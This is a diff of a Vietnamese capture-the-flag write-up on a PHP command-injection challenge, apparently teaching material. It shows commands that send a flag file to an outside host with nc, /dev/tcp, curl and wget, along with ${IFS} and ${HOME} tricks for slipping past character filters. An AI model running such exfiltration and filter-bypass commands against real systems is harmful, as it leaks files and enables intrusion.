@@ -24,20 +24,20 @@ Author: yakuhito
 + Dựa theo `output`của chương trình, chúng ta hoàn toàn không lấy được `flag`, cụ thể ở hàm **getFlag** chúng ta chỉ nhận được `Nope` hoặc `Maybe`. Cho nên hướng giải quyết sẽ là đẩy `flag` ra ngoài internet thông qua hàm **exec()**. Đến đây sẽ có 3 hướng giải quyết cho challenge này.
 - Hướng 1: **Command Injection**
 + Như mọi người có thể thấy biến `$command = "wget -q -O - https://kuhi.to/flag/" . $flag` hoàn toàn có thể cho phép chúng ta thực hiện `command injection`, cụ thể là `command1;command2|command3` với `command1` là chương trình `wget` đề cho, `command2` dùng để đọc nội dung file flag, `command3` dùng để chuyển output của `command2` ra ngoài internet. Đại loại mô hình chung sẽ là **wget -q -O - https://kuhi.to/flag/ ; cat flag.php | nc 9.9.9.9 9999** với `9.9.9.9` và `9999` là địa chỉ ip và port của chúng ta ở ngoài internet. Đến đây chúng ta sẽ cùng giải quyết 1 số vấn đề:
-+ Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, ...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
++ Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, base64...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
 ```sh
 cat${IFS}flag.php
 cat<flag.php
 {cat,flag.php}
 ```
-+ Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này "-{_\$.}"
++ Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này `-{_\$.}`
 nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
-+ Tiếp theo đến đoạn kết nối ra internet thì chúng ta có thể dùng `nc 9.9.9.9 9999`, tuy nhiên kí tự `|` lại không cho được phép. Sau 1 hồi search google thì phát hiện cái này khá hay **cat flag > /dev/tcp/9.9.9.9/9999**, trong đó kí tự ">" sẽ được thay bằng biến môi trường `${PS2}`, kí tự `/` tuy không được phép nhưng có thể thay bằng `${HOME}` (hoặc **${HOME:0:1}**), tuy nhiên cách này cũng fail vì kí tự `>` từ biến môi trường `${PS2}` được xem như là 1 file chứ không phải là kí tự redirect. Đến đây chúng ta fail ở việc kết nối 2 command lại với nhau. Vậy thử dụng 1 command kiểu như là:
++ Tiếp theo đến đoạn kết nối ra internet thì chúng ta có thể dùng `nc 9.9.9.9 9999`, tuy nhiên kí tự `|` lại không cho được phép. Sau 1 hồi search google thì phát hiện cách này khá hay **cat flag > /dev/tcp/9.9.9.9/9999**, trong đó kí tự ">" sẽ được thay bằng biến môi trường `${PS2}`, kí tự `/` tuy không được phép nhưng có thể thay bằng `${HOME}` (hoặc **${HOME:0:1}**), tuy nhiên cách này cũng fail vì kí tự `>` từ biến môi trường `${PS2}` được xem như là 1 file chứ không phải là kí tự `redirect`. Đến đây chúng ta fail ở việc kết nối 2 command lại với nhau. Vậy thử dụng 1 command kiểu như là:
 ```sh
 curl 9.9.9.9/`cat flag.php`
-wget 9.9.9.9/$(cat flag.php)
+wget 9.9.9.9/$(base64 flag.php)
 ```
-+ Nhưng cũng đều fail nốt vì 2 kí tư `$` và ``` đều bị filter hết. Thật ra với cách này mình fail từ đầu vì nghĩ rằng kí tự `\n` có thể làm kí phân tách giữa `command1` và `command2`. Nói chúng bị hàm **checkFlag** lọc kí tự như thế thì đúng là khó thở thật. 
++ Nhưng cũng đều fail nốt vì 2 kí tư "(" và "\`" đều bị filter hết. Thật ra với cách này mình fail từ đầu vì nghĩ rằng kí tự `\n` có thể làm kí phân cách giữa `command1` và `command2`. Nói chúng bị hàm **checkFlag** lọc kí tự như thế thì đúng là khó thở thật. 
 
 - Hướng 2: Bypass hàm **checkFlag**
 + Đầu tiên dễ nhìn thấy nhất, là hàm `php strlen`, liệu có cách nào để hàm này trả về giá trị nhỏ hơn giá trị thực để nó không kiểm tra được hết các kí tự chúng ta nhập vào không ta? Đến đây chợt nghĩ đến kí tự **\x00** và **overflow integer** nhưng sau 1 hồi test đều fail :TT 
